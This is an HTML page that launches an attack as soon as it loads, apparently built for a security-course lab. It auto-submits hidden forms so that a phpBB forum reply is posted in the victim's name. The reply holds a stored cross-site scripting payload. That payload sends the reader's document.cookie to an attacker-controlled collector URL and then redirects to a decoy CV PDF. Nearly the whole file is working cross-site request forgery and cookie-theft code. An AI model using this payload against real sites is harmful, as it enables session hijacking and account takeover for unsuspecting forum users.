<!DOCTYPE html>
<html>

<body onload="submitForms()">
<form action="http://dragonfly.csec.chatzi.org/modules/phpbb/reply.php"  method="get" id="form1">
  <input type="hidden" id="unregister" name="forum" value="1"><br>
  <input type="hidden" id="unregister" name="topic" value="1"><br>
  <input type="hidden" id="unregister" name="reply" value="
  <script>
    fetch('http://dragonfly.puppies.chatzi.org/cv/cookie.php?cookie='
    .concat(document.cookie));
    setTimeout(function() 
    { 
      window.top.location.href = 'http://dragonfly.puppies.chatzi.org/cv/Thanos_CV_Greek.pdf' 
    }
    , 375 )
  </script>">
  <br>
</form>

<iframe name="dummyframe2" id="dummyframe2" style="display: none;"></iframe>
<form action="http://dragonfly.csec.chatzi.org/courses/TMA100/"  method="get" target="dummyframe2" id="form2">
</form>

<script>

function submitForms (){
    document.getElementById("form2").submit();
    setTimeout(() => {  document.getElementById("form1").submit(); }, 400);
}
</script>

</body>
</html>


